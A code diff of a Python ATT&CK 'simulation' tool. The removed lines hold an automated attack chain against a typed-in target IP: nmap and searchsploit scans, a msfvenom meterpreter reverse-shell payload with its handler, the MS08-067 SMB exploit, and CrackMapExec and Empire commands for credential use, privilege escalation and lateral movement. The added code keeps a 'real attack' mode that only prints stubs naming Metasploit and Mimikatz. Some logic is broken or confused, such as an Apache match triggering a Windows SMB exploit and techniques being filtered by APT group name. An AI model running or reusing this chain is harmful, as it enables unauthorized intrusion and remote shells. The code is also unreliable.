@@ -12,9 +12,8 @@
 
 import json
 import requests
-import time
-import subprocess
 import os
+import time
 
 # Disclaimer
 def display_disclaimer():
@@ -27,10 +26,11 @@ def display_disclaimer():
     """
     print(disclaimer)
 
+
 # MITRE ATT&CK data URL (latest JSON dataset)
 ATTACK_DATA_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
 
-# Load the MITRE ATT&CK data (download it if necessary)
+# Load MITRE ATT&CK data
 def download_attack_data():
     response = requests.get(ATTACK_DATA_URL)
     if response.status_code == 200:
@@ -48,78 +48,72 @@ def load_attack_data(filename='attack_data.json'):
         data = json.load(f)
     return data
 
-# Perform Nmap scan to identify services and versions on the target IP
-def nmap_scan(target_ip):
-    nmap_command = f"nmap -sV {target_ip}"
-    result = subprocess.run(nmap_command, shell=True, capture_output=True, text=True)
-    return result.stdout
+# Display available APT groups from the ATT&CK data
+def display_apt_groups(data):
+    apt_groups = [group['name'] for group in data['objects'] if group['type'] == 'intrusion-set']
+    print("Select an APT Group:")
+    for i, group in enumerate(apt_groups, 1):
+        print(f"{i}. {group}")
+    return apt_groups
 
-# Search Sploit for known vulnerabilities related to the service and version
-def searchsploit_vulnerabilities(service_name, service_version):
-    search_command = f"searchsploit {service_name} {service_version}"
-    result = subprocess.run(search_command, shell=True, capture_output=True, text=True)
-    return result.stdout
+# Display techniques for the selected APT group
+def display_techniques(data, selected_group):
+    techniques = []
+    for obj in data['objects']:
+        if obj['type'] == 'attack-pattern' and 'kill_chain_phases' in obj:
+            for phase in obj['kill_chain_phases']:
+                if phase['phase_name'] == selected_group:
+                    techniques.append(obj['name'])
+    print("\nSelect Techniques to simulate:")
+    for i, technique in enumerate(techniques, 1):
+        print(f"{i}. {technique}")
+    return techniques
 
-# Attempt to exploit a service using Metasploit with staged payloads
-def attempt_exploit_with_metasploit(service_name, service_version, target_ip):
-    print(f"[INFO] Attempting to exploit {service_name} {service_version} on {target_ip}...")
-
-    search_command = f"searchsploit {service_name} {service_version}"
-    result = subprocess.run(search_command, shell=True, capture_output=True, text=True)
-
-    if "Apache" in result.stdout:  # Check if Apache exploit exists in SearchSploit output
-        print(f"[INFO] Found exploit for {service_name} {service_version}!")
-
-        # Metasploit: Generate the staged payload using msfvenom
-        payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o /tmp/reverse_shell.exe"
-        subprocess.run(payload_command, shell=True)
-
-        # Step 1: Start Metasploit handler for reverse shell connection
-        metasploit_handler_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; run'"
-        subprocess.run(metasploit_handler_command, shell=True)
-        
-        # Step 2: Use Metasploit to launch the exploit (staged payload)
-        metasploit_exploit_command = f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOST {target_ip}; run'"
-        subprocess.run(metasploit_exploit_command, shell=True)
-        
-        print("[INFO] Exploit attempted, reverse shell initiated.")
-
-    else:
-        print(f"[INFO] No Metasploit exploit found for {service_name} {service_version}.")
-
-# Run CrackMapExec for SMB enumeration and exploitation
-def run_crackmapexec(target_ip):
-    print(f"[INFO] Running CrackMapExec against {target_ip}...")
-    # Example SMB enumeration
-    crackmapexec_command = f"crackmapexec smb {target_ip} -u 'username' -p 'password'"
-    subprocess.run(crackmapexec_command, shell=True)
-
-# Run Empire post-exploitation framework
-def run_empire_post_exploitation(target_ip):
-    print(f"[INFO] Running Empire post-exploitation on {target_ip}...")
-    empire_command = f"empire --agents {target_ip} --use_ssl"
-    subprocess.run(empire_command, shell=True)
-
-# Perform Windows privilege escalation using Empire
-def windows_privilege_escalation():
-    print("[INFO] Running privilege escalation via Empire...")
-    empire_command = "empire --use_ssl --agents --privilege-escalation"
-    subprocess.run(empire_command, shell=True)
-
-# Perform lateral movement using valid credentials (via CrackMapExec)
-def lateral_movement(target_ip):
-    print(f"[INFO] Attempting lateral movement on {target_ip}...")
-    crackmapexec_command = f"crackmapexec smb {target_ip} -u 'admin' -p 'password'"
-    subprocess.run(crackmapexec_command, shell=True)
-
-# Simulation of attack techniques based on MITRE ATT&CK framework
-def simulate_technique(apt_group, technique):
-    print(f"\n[INFO] Simulating {technique} for APT Group: {apt_group}...")
+# Simulate the selected techniques (simulation mode)
+def simulate_technique(technique):
+    print(f"[INFO] Simulating {technique}...")
     time.sleep(2)  # Simulate execution time
     print(f"[INFO] Simulation for {technique} complete.\n")
 
-# Main function for the simulation mode
-def run_simulation():
+# Generate text report for the simulated techniques
+def generate_text_report(apt_group, techniques):
+    with open(f"{apt_group}_report.txt", 'w') as report_file:
+        report_file.write(f"APT Group: {apt_group}\n\n")
+        for technique in techniques:
+            report_file.write(f"- {technique}\n")
+    print(f"[INFO] Report generated: {apt_group}_report.txt")
+
+# Generate HTML report for the simulated techniques
+def generate_html_report(apt_group, techniques):
+    with open(f"{apt_group}_report.html", 'w') as report_file:
+        report_file.write(f"<html><body><h1>APT Group: {apt_group}</h1><ul>\n")
+        for technique in techniques:
+            report_file.write(f"<li>{technique}</li>\n")
+        report_file.write("</ul></body></html>")
+    print(f"[INFO] Report generated: {apt_group}_report.html")
+
+# Perform real-world penetration testing (based on techniques and selected APT group)
+def perform_real_attack(apt_group, techniques):
+    print(f"[INFO] Performing real-world attacks for APT Group: {apt_group}...")
+    for technique in techniques:
+        print(f"[INFO] Executing attack for technique: {technique}")
+        # Logic to exploit techniques
+        if "Spearphishing" in technique:
+            # Simulate a spearphishing attack (this would require an actual implementation for phishing)
+            print("[INFO] Simulating spearphishing attack.")
+        elif "Exploitation of Vulnerability" in technique:
+            # Exploit a vulnerability (e.g., MS08-067 for SMB)
+            print("[INFO] Running Metasploit for MS08-067 SMB exploit.")
+            # Add Metasploit exploit code here
+        elif "Credential Dumping" in technique:
+            # Use Mimikatz to dump credentials
+            print("[INFO] Running Mimikatz for credential dumping.")
+            # Add Mimikatz code here
+        else:
+            print(f"[INFO] No specific action for technique: {technique}")
+
+# Main function to run the attack simulation or real attack
+def run_attack():
     # Step 1: Check if ATT&CK data exists or download it
     if not os.path.exists('attack_data.json'):
         print("[INFO] ATT&CK data not found. Downloading...")
@@ -127,22 +121,13 @@ def run_simulation():
     data = load_attack_data()  # Load the ATT&CK dataset
 
     # Step 2: Display available APT groups and let user select
-    apt_groups = [group['name'] for group in data['objects'] if group['type'] == 'intrusion-set']
-    print("Select an APT Group:")
-    for i, group in enumerate(apt_groups, 1):
-        print(f"{i}. {group}")
-
+    apt_groups = display_apt_groups(data)
     apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
     selected_group = apt_groups[apt_group_selection - 1]
     print(f"[INFO] You selected: {selected_group}")
 
     # Step 3: Display techniques for the selected APT group
-    techniques = [obj['name'] for obj in data['objects'] if obj['type'] == 'attack-pattern' and selected_group in [phase['phase_name'] for phase in obj.get('kill_chain_phases', [])]]
-    
-    print("\nSelect Techniques to simulate:")
-    for i, technique in enumerate(techniques, 1):
-        print(f"{i}. {technique}")
-    
+    techniques = display_techniques(data, selected_group)
     selected_techniques = []
     while True:
         technique_selection = int(input(f"\nSelect a technique (1-{len(techniques)}), or 0 to finish: "))
@@ -150,53 +135,25 @@ def run_simulation():
             break
         selected_technique = techniques[technique_selection - 1]
         selected_techniques.append(selected_technique)
-        simulate_technique(selected_group, selected_technique)
 
-    # Step 4: Report Generation
-    report_format = input("Generate report in text or HTML format? (text/html): ").lower()
-    if report_format == 'text':
-        generate_text_report(selected_group, selected_techniques)
-    elif report_format == 'html':
-        generate_html_report(selected_group, selected_techniques)
+    # Step 4: Ask for simulation or real attack mode
+    mode = input("Select mode (simulation/real): ").strip().lower()
+    if mode == 'simulation':
+        # Simulate techniques and generate reports
+        for technique in selected_techniques:
+            simulate_technique(technique)
+        report_format = input("Generate report in text or HTML format? (text/html): ").lower()
+        if report_format == 'text':
+            generate_text_report(selected_group, selected_techniques)
+        elif report_format == 'html':
+            generate_html_report(selected_group, selected_techniques)
+        else:
+            print("[ERROR] Invalid report format.")
+    elif mode == 'real':
+        # Perform real-world penetration testing
+        perform_real_attack(selected_group, selected_techniques)
     else:
-        print("[ERROR] Invalid report format.")
-
-# Main function for the penetration testing mode
-def run_penetration_testing():
-    target_ip = input("Enter target IP: ")
-    print(f"Starting penetration testing on {target_ip}...\n")
-
-    # Run Nmap Scan
-    nmap_results = nmap_scan(target_ip)
-    print(f"\nNmap Results for {target_ip}:")
-    print(nmap_results)
-
-    # Simulate the exploitation phase
-    attempt_exploit_with_metasploit("Apache", "2.4.49", target_ip)
-
-    # Run CrackMapExec
-    run_crackmapexec(target_ip)
-
-    # Run Empire Post-exploitation
-    run_empire_post_exploitation(target_ip)
-
-    # Perform Windows Privilege Escalation
-    windows_privilege_escalation()
-
-    # Perform lateral movement
-    lateral_movement(target_ip)
-
-# Main function to select between simulation and penetration testing modes
-def main():
-    display_disclaimer()
-    mode = input("Select Mode (1 for Simulation, 2 for Penetration Testing): ")
-    
-    if mode == '1':
-        run_simulation()
-    elif mode == '2':
-        run_penetration_testing()
-    else:
-        print("[ERROR] Invalid selection.")
+        print("[ERROR] Invalid mode selected.")
 
 if __name__ == "__main__":
-    main()
+    run_attack()
